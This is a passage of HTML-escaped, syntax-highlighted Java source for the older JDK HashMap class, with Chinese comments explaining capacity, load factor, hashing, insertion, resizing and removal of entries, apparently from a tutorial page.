    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认的初始容量（容量为HashMap中槽的数目）是16，且实际容量必须是2的整数次幂。  &lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; DEFAULT_INITIAL_CAPACITY = 16&lt;span&gt;;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 最大容量（必须是2的幂且小于2的30次方，传入容量过大将被这个值替换）  &lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; MAXIMUM_CAPACITY = 1 &amp;lt;&amp;lt; 30&lt;span&gt;;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认加载因子为0.75 &lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;float&lt;/span&gt; DEFAULT_LOAD_FACTOR = 0.75f&lt;span&gt;;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 存储数据的Entry数组，长度是2的幂。  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap采用链表法解决冲突，每一个Entry本质上是一个单向链表  &lt;/span&gt;
    &lt;span&gt;transient&lt;/span&gt;&lt;span&gt; Entry[] table;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap的底层数组中已用槽的数量  &lt;/span&gt;
    &lt;span&gt;transient&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap的阈值，用于判断是否需要调整HashMap的容量（threshold = 容量*加载因子）  &lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;&lt;span&gt; threshold;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 加载因子实际大小  &lt;/span&gt;
    &lt;span&gt;final&lt;/span&gt; &lt;span&gt;float&lt;/span&gt;&lt;span&gt; loadFactor;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap被改变的次数  &lt;/span&gt;
    &lt;span&gt;transient&lt;/span&gt; &lt;span&gt;volatile&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; modCount;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 指定“容量大小”和“加载因子”的构造函数  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; HashMap(&lt;span&gt;int&lt;/span&gt; initialCapacity, &lt;span&gt;float&lt;/span&gt;&lt;span&gt; loadFactor) {  
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (initialCapacity &amp;lt; 0&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;Illegal initial capacity: &quot; +&lt;span&gt;  
                                               initialCapacity);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap的最大容量只能是MAXIMUM_CAPACITY  &lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (initialCapacity &amp;gt;&lt;span&gt; MAXIMUM_CAPACITY)  
            initialCapacity &lt;/span&gt;=&lt;span&gt; MAXIMUM_CAPACITY;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加载因此不能小于0&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (loadFactor &amp;lt;= 0 ||&lt;span&gt; Float.isNaN(loadFactor))  
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;Illegal load factor: &quot; +&lt;span&gt;  
                                               loadFactor);  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 找出“大于initialCapacity”的最小的2的幂  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; capacity = 1&lt;span&gt;;  
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (capacity &amp;lt;&lt;span&gt; initialCapacity)  
            capacity &lt;/span&gt;&amp;lt;&amp;lt;= 1&lt;span&gt;;  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“加载因子”  &lt;/span&gt;
        &lt;span&gt;this&lt;/span&gt;.loadFactor =&lt;span&gt; loadFactor;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“HashMap阈值”，当HashMap中存储数据的数量达到threshold时，就需要将HashMap的容量加倍。  &lt;/span&gt;
        threshold = (&lt;span&gt;int&lt;/span&gt;)(capacity *&lt;span&gt; loadFactor);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建Entry数组，用来保存数据  &lt;/span&gt;
        table = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[capacity];  
        init();  
    }  
 
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 指定“容量大小”的构造函数  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; HashMap(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; initialCapacity) {  
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;(initialCapacity, DEFAULT_LOAD_FACTOR);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认构造函数。  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; HashMap() {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“加载因子”为默认加载因子0.75  &lt;/span&gt;
        &lt;span&gt;this&lt;/span&gt;.loadFactor =&lt;span&gt; DEFAULT_LOAD_FACTOR;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“HashMap阈值”，当HashMap中存储数据的数量达到threshold时，就需要将HashMap的容量加倍。  &lt;/span&gt;
        threshold = (&lt;span&gt;int&lt;/span&gt;)(DEFAULT_INITIAL_CAPACITY *&lt;span&gt; DEFAULT_LOAD_FACTOR);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建Entry数组，用来保存数据  &lt;/span&gt;
        table = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[DEFAULT_INITIAL_CAPACITY];  
        init();  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 包含“子Map”的构造函数  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; HashMap(Map&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt;&lt;span&gt; m) {  
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(Math.max((&lt;span&gt;int&lt;/span&gt;) (m.size() / DEFAULT_LOAD_FACTOR) + 1&lt;span&gt;,  
                      DEFAULT_INITIAL_CAPACITY), DEFAULT_LOAD_FACTOR);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将m中的全部元素逐个添加到HashMap中  &lt;/span&gt;
&lt;span&gt;        putAllForCreate(m);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;求hash值的方法，重新计算hash值&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; hash(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; h) {  
        h &lt;/span&gt;^= (h &amp;gt;&amp;gt;&amp;gt; 20) ^ (h &amp;gt;&amp;gt;&amp;gt; 12&lt;span&gt;);  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; h ^ (h &amp;gt;&amp;gt;&amp;gt; 7) ^ (h &amp;gt;&amp;gt;&amp;gt; 4&lt;span&gt;);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回h在数组中的索引值，这里用&amp;amp;代替取模，旨在提升效率 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; h &amp;amp; (length-1)保证返回值的小于length  &lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; indexFor(&lt;span&gt;int&lt;/span&gt; h, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; length) {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; h &amp;amp; (length-1&lt;span&gt;);  
    }  
 
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; size;  
    }  
 
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isEmpty() {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; size == 0&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取key对应的value  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; V get(Object key) {  
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; getForNullKey();  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取key的hash值  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; hash =&lt;span&gt; hash(key.hashCode());  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在“该hash值对应的链表”上查找“键值等于key”的元素  &lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e =&lt;span&gt; table[indexFor(hash, table.length)];  
             e &lt;/span&gt;!= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
             e &lt;/span&gt;=&lt;span&gt; e.next) {  
            Object k;  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断key是否相同&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key ||&lt;span&gt; key.equals(k)))  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e.value;  
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;没找到则返回null&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取“key为null”的元素的值  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap将“key为null”的元素存储在table[0]位置，但不一定是该链表的第一个位置！  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; V getForNullKey() {  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e = table[0]; e != &lt;span&gt;null&lt;/span&gt;; e =&lt;span&gt; e.next) {  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e.value;  
        }  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap是否包含key  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsKey(Object key) {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; getEntry(key) != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“键为key”的键值对  &lt;/span&gt;
    &lt;span&gt;final&lt;/span&gt; Entry&amp;lt;K,V&amp;gt;&lt;span&gt; getEntry(Object key) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取哈希值  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap将“key为null”的元素存储在table[0]位置，“key不为null”的则调用hash()计算哈希值  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; hash = (key == &lt;span&gt;null&lt;/span&gt;) ? 0&lt;span&gt; : hash(key.hashCode());  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在“该hash值对应的链表”上查找“键值等于key”的元素  &lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e =&lt;span&gt; table[indexFor(hash, table.length)];  
             e &lt;/span&gt;!= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
             e &lt;/span&gt;=&lt;span&gt; e.next) {  
            Object k;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp;&lt;span&gt;  
                ((k &lt;/span&gt;= e.key) == key || (key != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; key.equals(k))))  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;  
        }  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将“key-value”添加到HashMap中  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; V put(K key, V value) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“key为null”，则将该键值对添加到table[0]中。  &lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; putForNullKey(value);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“key不为null”，则计算该key的哈希值，然后将其添加到该哈希值对应的链表中。  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; hash =&lt;span&gt; hash(key.hashCode());  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i =&lt;span&gt; indexFor(hash, table.length);  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != &lt;span&gt;null&lt;/span&gt;; e =&lt;span&gt; e.next) {  
            Object k;  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“该key”对应的键值对已经存在，则用新的value取代旧的value。然后退出！  &lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key ||&lt;span&gt; key.equals(k))) {  
                V oldValue &lt;/span&gt;=&lt;span&gt; e.value;  
                e.value &lt;/span&gt;=&lt;span&gt; value;  
                e.recordAccess(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;  
            }  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“该key”对应的键值对不存在，则将“key-value”添加到table中  &lt;/span&gt;
        modCount++&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将key-value添加到table[i]处&lt;/span&gt;
&lt;span&gt;        addEntry(hash, key, value, i);  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; putForNullKey()的作用是将“key为null”键值对添加到table[0]位置  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; V putForNullKey(V value) {  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e = table[0]; e != &lt;span&gt;null&lt;/span&gt;; e =&lt;span&gt; e.next) {  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {  
                V oldValue &lt;/span&gt;=&lt;span&gt; e.value;  
                e.value &lt;/span&gt;=&lt;span&gt; value;  
                e.recordAccess(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;  
            }  
        }  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果没有存在key为null的键值对，则直接题阿见到table[0]处!  &lt;/span&gt;
        modCount++&lt;span&gt;;  
        addEntry(&lt;/span&gt;0, &lt;span&gt;null&lt;/span&gt;, value, 0&lt;span&gt;);  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建HashMap对应的“添加方法”，  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 它和put()不同。putForCreate()是内部方法，它被构造函数等调用，用来创建HashMap  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 而put()是对外提供的往HashMap中添加元素的方法。  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; putForCreate(K key, V value) {  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; hash = (key == &lt;span&gt;null&lt;/span&gt;) ? 0&lt;span&gt; : hash(key.hashCode());  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i =&lt;span&gt; indexFor(hash, table.length);  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若该HashMap表中存在“键值等于key”的元素，则替换该元素的value值  &lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != &lt;span&gt;null&lt;/span&gt;; e =&lt;span&gt; e.next) {  
            Object k;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp;&lt;span&gt;  
                ((k &lt;/span&gt;= e.key) == key || (key != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; key.equals(k)))) {  
                e.value &lt;/span&gt;=&lt;span&gt; value;  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;  
            }  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若该HashMap表中不存在“键值等于key”的元素，则将该key-value添加到HashMap中  &lt;/span&gt;
&lt;span&gt;        createEntry(hash, key, value, i);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将“m”中的全部元素都添加到HashMap中。  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 该方法被内部的构造HashMap的方法所调用。  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; putAllForCreate(Map&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt;&lt;span&gt; m) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 利用迭代器将元素逐个添加到HashMap中  &lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (Iterator&amp;lt;? &lt;span&gt;extends&lt;/span&gt; Map.Entry&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt;&amp;gt; i =&lt;span&gt; m.entrySet().iterator(); i.hasNext(); ) {  
            Map.Entry&lt;/span&gt;&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt; e =&lt;span&gt; i.next();  
            putForCreate(e.getKey(), e.getValue());  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 重新调整HashMap的大小，newCapacity是调整后的容量  &lt;/span&gt;
    &lt;span&gt;void&lt;/span&gt; resize(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; newCapacity) {  
        Entry[] oldTable &lt;/span&gt;=&lt;span&gt; table;  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; oldCapacity =&lt;span&gt; oldTable.length; 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果就容量已经达到了最大值，则不能再扩容，直接返回&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (oldCapacity ==&lt;span&gt; MAXIMUM_CAPACITY) {  
            threshold &lt;/span&gt;=&lt;span&gt; Integer.MAX_VALUE;  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 新建一个HashMap，将“旧HashMap”的全部元素添加到“新HashMap”中，  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后，将“新HashMap”赋值给“旧HashMap”。  &lt;/span&gt;
        Entry[] newTable = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[newCapacity];  
        transfer(newTable);  
        table &lt;/span&gt;=&lt;span&gt; newTable;  
        threshold &lt;/span&gt;= (&lt;span&gt;int&lt;/span&gt;)(newCapacity *&lt;span&gt; loadFactor);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将HashMap中的全部元素都添加到newTable中  &lt;/span&gt;
    &lt;span&gt;void&lt;/span&gt;&lt;span&gt; transfer(Entry[] newTable) {  
        Entry[] src &lt;/span&gt;=&lt;span&gt; table;  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; newCapacity =&lt;span&gt; newTable.length;  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = 0; j &amp;lt; src.length; j++&lt;span&gt;) {  
            Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; src[j];  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {  
                src[j] &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
                &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt; {  
                    Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; next =&lt;span&gt; e.next;  
                    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i =&lt;span&gt; indexFor(e.hash, newCapacity);  
                    e.next &lt;/span&gt;=&lt;span&gt; newTable[i];  
                    newTable[i] &lt;/span&gt;=&lt;span&gt; e;  
                    e &lt;/span&gt;=&lt;span&gt; next;  
                } &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (e != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);  
            }  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将&quot;m&quot;的全部元素都添加到HashMap中  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; putAll(Map&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt;&lt;span&gt; m) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 有效性判断  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; numKeysToBeAdded =&lt;span&gt; m.size();  
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (numKeysToBeAdded == 0&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 计算容量是否足够，  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“当前阀值容量 &amp;lt; 需要的容量”，则将容量x2。  &lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (numKeysToBeAdded &amp;gt;&lt;span&gt; threshold) {  
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; targetCapacity = (&lt;span&gt;int&lt;/span&gt;)(numKeysToBeAdded / loadFactor + 1&lt;span&gt;);  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (targetCapacity &amp;gt;&lt;span&gt; MAXIMUM_CAPACITY)  
                targetCapacity &lt;/span&gt;=&lt;span&gt; MAXIMUM_CAPACITY;  
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; newCapacity =&lt;span&gt; table.length;  
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (newCapacity &amp;lt;&lt;span&gt; targetCapacity)  
                newCapacity &lt;/span&gt;&amp;lt;&amp;lt;= 1&lt;span&gt;;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (newCapacity &amp;gt;&lt;span&gt; table.length)  
                resize(newCapacity);  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通过迭代器，将“m”中的元素逐个添加到HashMap中。  &lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (Iterator&amp;lt;? &lt;span&gt;extends&lt;/span&gt; Map.Entry&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt;&amp;gt; i =&lt;span&gt; m.entrySet().iterator(); i.hasNext(); ) {  
            Map.Entry&lt;/span&gt;&amp;lt;? &lt;span&gt;extends&lt;/span&gt; K, ? &lt;span&gt;extends&lt;/span&gt; V&amp;gt; e =&lt;span&gt; i.next();  
            put(e.getKey(), e.getValue());  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除“键为key”元素  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; V remove(Object key) {  
        Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; removeEntryForKey(key);  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (e == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : e.value);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除“键为key”的元素  &lt;/span&gt;
    &lt;span&gt;final&lt;/span&gt; Entry&amp;lt;K,V&amp;gt;&lt;span&gt; removeEntryForKey(Object key) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取哈希值。若key为null，则哈希值为0；否则调用hash()进行计算  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; hash = (key == &lt;span&gt;null&lt;/span&gt;) ? 0&lt;span&gt; : hash(key.hashCode());  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i =&lt;span&gt; indexFor(hash, table.length);  
        Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; prev =&lt;span&gt; table[i];  
        Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; prev;  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除链表中“键为key”的元素  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 本质是“删除单向链表中的节点”  &lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt; (e != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {  
            Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; next =&lt;span&gt; e.next;  
            Object k;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp;&lt;span&gt;  
                ((k &lt;/span&gt;= e.key) == key || (key != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; key.equals(k)))) {  
                modCount&lt;/span&gt;++&lt;span&gt;;  
                size&lt;/span&gt;--&lt;span&gt;;  
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (prev ==&lt;span&gt; e)  
                    table[i] &lt;/span&gt;=&lt;span&gt; next;  
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; 
                    prev.next &lt;/span&gt;=&lt;span&gt; next;  
                e.recordRemoval(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;  
            }  
            prev &lt;/span&gt;=&lt;span&gt; e;  
            e &lt;/span&gt;=&lt;span&gt; next;  
        }  
 
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除“键值对”  &lt;/span&gt;
    &lt;span&gt;final&lt;/span&gt; Entry&amp;lt;K,V&amp;gt;&lt;span&gt; removeMapping(Object o) {  
